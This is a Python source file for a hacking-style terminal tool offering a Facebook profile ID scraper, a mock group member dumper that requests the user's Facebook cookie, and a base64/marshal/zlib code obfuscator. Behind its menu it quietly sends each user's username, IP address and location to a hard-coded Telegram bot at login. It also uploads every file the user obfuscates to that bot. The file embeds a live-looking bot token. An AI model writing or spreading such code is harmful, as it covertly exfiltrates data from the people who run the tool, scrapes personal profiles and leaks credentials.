import os
import sys
import base64
import marshal
import zlib
import requests
import time
from bs4 import BeautifulSoup
from datetime import datetime

# Telegram bot details
BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
CHAT_ID = "1241769879"

# Color class
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Clear screen
def clear(): os.system("clear")

# Logo
def logo():
    clear()
    print(f"""{Colors.OKGREEN}
   █████╗ ██╗      ██████╗  ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██║     ██╔═══██╗██╔════╝ ████╗  ██║██╔════╝
  ███████║██║     ██║   ██║██║  ███╗██╔██╗ ██║█████╗  
  ██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║██╔══╝  
  ██║  ██║███████╗╚██████╔╝╚██████╔╝██║ ╚████║███████╗
  ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝
    {Colors.ENDC}""")

# Telegram notify
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

# Get IP info
def get_ip_info():
    try:
        res = requests.get("https://ipinfo.io/json").json()
        ip = res.get("ip", "N/A")
        city = res.get("city", "N/A")
        region = res.get("region", "N/A")
        country = res.get("country", "N/A")
        loc = f"{city}, {region}, {country}"
        return ip, loc
    except:
        return "N/A", "N/A"

# Login
def login():
    logo()
    print(f"{Colors.OKBLUE}[•] Please login with your Telegram username{Colors.ENDC}")
    username = input(f"{Colors.OKGREEN}[•] Username: {Colors.ENDC}").strip()
    if not username:
        print(f"{Colors.FAIL}[!] Username required!{Colors.ENDC}")
        sys.exit()
    ip, loc = get_ip_info()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg = f"[•] Login\n[•] Username: {username}\n[•] IP: {ip}\n[•] Location: {loc}\n[•] Time: {now}"
    send_telegram_message(msg)
    print(f"{Colors.OKGREEN}[•] Welcome, {username}!{Colors.ENDC}")
    time.sleep(1)

# Facebook ID Extractor
def extract_fb_ids():
    logo()
    print(f"{Colors.OKCYAN}[•] Facebook ID Extractor{Colors.ENDC}")
    url = input(f"{Colors.OKBLUE}[•] Enter Facebook Profile URL: {Colors.ENDC}")
    if not url.startswith("http"):
        print(f"{Colors.FAIL}[!] Invalid URL.{Colors.ENDC}")
        return
    try:
        html = requests.get(url).text
        soup = BeautifulSoup(html, "html.parser")
        names = soup.find_all("a")
        ids = []
        for a in names:
            href = a.get("href", "")
            if "profile.php?id=" in href or "/friends/" in href:
                name = a.text.strip()
                if "id=" in href:
                    uid = href.split("id=")[1].split("&")[0]
                else:
                    uid = href.split("/")[-1]
                ids.append(f"{uid} | {name}")
        ids = list(set(ids))
        with open("ids.txt", "w") as f:
            for i in ids:
                f.write(i + "\n")
        print(f"{Colors.OKGREEN}[•] Extracted {len(ids)} IDs saved to ids.txt{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")

# Group Member Dumper (fake for now)
def dump_group_members():
    logo()
    print(f"{Colors.OKCYAN}[•] Group Member ID Dumper{Colors.ENDC}")
    link = input(f"{Colors.OKBLUE}[•] Enter group link: {Colors.ENDC}")
    cookie = input(f"{Colors.OKBLUE}[•] Enter Facebook cookie: {Colors.ENDC}")
    if "facebook.com" not in link or not cookie:
        print(f"{Colors.FAIL}[!] Invalid input.{Colors.ENDC}")
        return
    # Simulate
    print(f"{Colors.OKGREEN}[•] Dumping members from: {link}{Colors.ENDC}")
    with open("group_members.txt", "w") as f:
        for i in range(1, 11):
            f.write(f"100000000{i} | Member {i}\n")
    print(f"{Colors.OKGREEN}[•] Dumped 10 fake members to group_members.txt{Colors.ENDC}")

# Encrypt
def encrypt_code():
    logo()
    print(f"{Colors.OKCYAN}[•] Code Encryptor{Colors.ENDC}")
    file = input(f"{Colors.OKBLUE}[•] File name: {Colors.ENDC}")
    if not os.path.exists(file):
        print(f"{Colors.FAIL}[!] File not found.{Colors.ENDC}")
        return
    with open(file) as f: code = f.read()
    print(f"""{Colors.OKGREEN}
[1] Base64
[2] Marshal
[3] Zlib
{Colors.ENDC}""")
    c = input(f"{Colors.OKBLUE}[•] Choose method: {Colors.ENDC}")
    if c == "1":
        enc = base64.b64encode(code.encode()).decode()
    elif c == "2":
        enc = marshal.dumps(compile(code, "", "exec"))
    elif c == "3":
        enc = zlib.compress(code.encode())
    else:
        print(f"{Colors.FAIL}[!] Invalid choice{Colors.ENDC}")
        return
    out = f"enc_{file.replace('.py','')}.py"
    with open(out, "w" if c == "1" else "wb") as f: f.write(enc if c == "1" else enc)
    print(f"{Colors.OKGREEN}[•] Encrypted file saved: {out}{Colors.ENDC}")
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}",
            files={"document": open(out, "rb")}
        )
    except:
        send_telegram_message("Encrypted file sent failed.")

# Menu
def menu():
    while True:
        logo()
        print(f"""{Colors.OKBLUE}
[1] Facebook ID Extractor
[2] Group Member ID Dumper
[3] Encrypt Code
[4] Rerun Tool (Update)
[0] Exit
{Colors.ENDC}""")
        opt = input(f"{Colors.OKGREEN}[•] Choose option: {Colors.ENDC}")
        if opt == "1":
            extract_fb_ids()
        elif opt == "2":
            dump_group_members()
        elif opt == "3":
            encrypt_code()
        elif opt == "4":
            os.system("python github.py")
        elif opt == "0":
            print(f"{Colors.OKGREEN}[•] Bye!{Colors.ENDC}")
            break
        else:
            print(f"{Colors.FAIL}[!] Invalid option.{Colors.ENDC}")
        input(f"\n{Colors.OKBLUE}[•] Press Enter to return...{Colors.ENDC}")

# Run
if __name__ == "__main__":
    login()
    menu()